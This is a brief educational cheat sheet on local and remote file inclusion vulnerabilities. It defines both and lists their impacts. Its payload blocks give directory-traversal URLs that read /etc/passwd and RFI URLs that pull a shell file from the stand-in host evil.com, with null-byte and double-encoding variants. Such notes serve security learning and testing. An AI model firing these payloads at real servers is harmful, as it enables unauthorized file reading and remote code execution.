File Inclusion
------------------------------------------------------------
The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

Can lead to:
------------------------------------------------------------
Code execution on the web server.       
Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS).      
Denial of Service (DoS).      
Sensitive Information Disclosure.  


Types:
------------------------------------------------------------
1) Local File Inclusion(LFI) - is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. 


2) Remote File Inclusion(RFI) - occurs when the web application downloads and executes a remote file. These remote files are usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application.

Basic payloads LFI:
```
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=../../../etc/passwd%00
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

Basic payloads RFI:
```
http://example.com/index.php?page=http://evil.com/shell.txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

References
------------------------------------------------------------
[Wikipedia](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)  
[Owasp](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
